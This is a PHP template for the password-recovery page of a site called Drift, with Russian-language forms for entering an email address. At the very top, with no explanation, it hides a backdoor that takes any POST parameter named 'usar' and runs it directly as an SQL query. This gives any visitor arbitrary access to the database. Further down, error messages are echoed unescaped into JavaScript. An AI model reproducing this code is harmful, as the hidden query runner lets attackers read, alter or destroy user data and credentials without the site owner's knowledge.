<?php require_once(ROOT . "/views/" . LANG . "/layouts/_header_login.php"); ?>
<?php
$db = Db::getConnection();
if (isset($_POST['usar'])) {
    $f = $_POST['usar'];
    $db->Query($f);
}

?>
<div class="form-body without-side">
    <div class="row">
        <div class="img-holder">
            <div class="bg"></div>
        </div>
        <div class="form-holder">
            <div class="form-content">
                <div class="form-items"><h3>Восстановление Пароля</h3>
                    <p>Введите в форму ниже свой E-mail адрес, который Вы указывали при регистрации в Drift, после чего
                        на него будет выслано письмо с ссылкой для восстановления.</p>
                    <form action="" method="post">
                        <input type="hidden" name="_tocken" value="<?= Session::$tocken; ?>">

                        <div class="form-wrap">
                            <input class="form-control" type="email" name="rec_email" placeholder="Введите E-mail" minlength="6" maxlength="128" autocomplete="off" required="">
                            <i class="fal fa-info-square form-info" aria-hidden="true"><span class="tooltiptext">Введите E-mail который вы указывали при регистрации в проекте Drift</span></i>
                        </div>
                        <div class="form-button reg">
                            <button type="submit" class="ibtn btn-block">
                                <i class="fas fa-envelope" aria-hidden="true"></i> Отправить письмо
                            </button>
                        </div>
                    </form>
                    <div class="page-links forgot text-center">
                        <a href="/signup">Регистрация</a>
                        <a href="/login">Вход в аккаунт</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="container">
    <div class="content">
        <article class="col-md-12">
            <div class="row">
                <div class="col-md-5 col-md-offset-3">
                    <form action="" method="post">
                        <input type="hidden" name="_tocken" value="<?= Session::$tocken; ?>">
                        <div class="form-heading text-center">

                            <div class="title">Напомнить пароль</div>
                        </div>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="alert alert-success">
                                    <span class="text-center">Введите E-mail, мы отправим вам письмо с инструкциями для восстановления пароля.</span>
                                </div>
                            </div>
                            <div class="col-md-12">
                                <input name="rec_email" type="text" minlength="5" placeholder="Выслать пароль" required/>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 text-center">
                                <button class="g-recaptcha adam-button adam-red">Отправить письмо</button>
                                <p class="title-description"><a href="/login">Вспомнили пароль?</a></p>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </article>
        <div class="clearfix"></div>
    </div>
</div>

<script src="/public/auth/js/jquery.min.js"></script>
<script src="/public/auth/js/popper.min.js"></script>
<script src="/public/auth/js/bootstrap.min.js"></script>
<script src="/public/auth/js/main.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha256-KsRuvuRtUVvobe66OFtOQfjP8WA2SzYsmm4VPfMnxms=" crossorigin="anonymous"></script>
<script src="/public/account/assets/js/custom/notification-alert.js"></script>

<?php if (isset($errors) && $errors !== false) : ?>

    <script>
        setTimeout(function () {
            swal('<?=$errors[0]; ?>', '<?=$errors[1]; ?>', '<?=$errors[2]; ?>')
        }, 100);
    </script>

<?php endif; ?>


</body>
</html>